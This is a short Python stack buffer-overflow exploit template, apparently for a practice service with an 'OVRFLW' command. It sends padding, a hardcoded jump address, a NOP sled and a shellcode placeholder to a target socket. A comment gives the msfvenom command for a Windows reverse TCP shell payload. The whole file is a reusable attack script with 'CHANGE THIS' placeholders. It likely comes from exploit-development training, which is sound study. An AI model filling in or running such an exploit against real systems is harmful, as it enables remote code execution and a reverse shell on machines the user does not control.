import socket, time, sys

ip = "XXXXX" #CHANGE THIS
port = XXX #CHANGE THIS
timeout = 5

pattern = "A" * 1377 #CHANGE THIS

#msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx EXITFUNC=thread -f c -a x86 -b "badchars" 

shell = ("SHELLCODE HERE")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip, port))
s.recv(1024)
print("Sending pattern of %s bytes" % len(pattern))
s.send("OVRFLW " + pattern + "\x83\x66\x52\x56" + 16 * "\x90" + shell) #  DON'T FORGET TO CHANGE THE JMP POINT ADDRESS TO LITTLE ENDIAN
s.recv(1024)
s.close() 
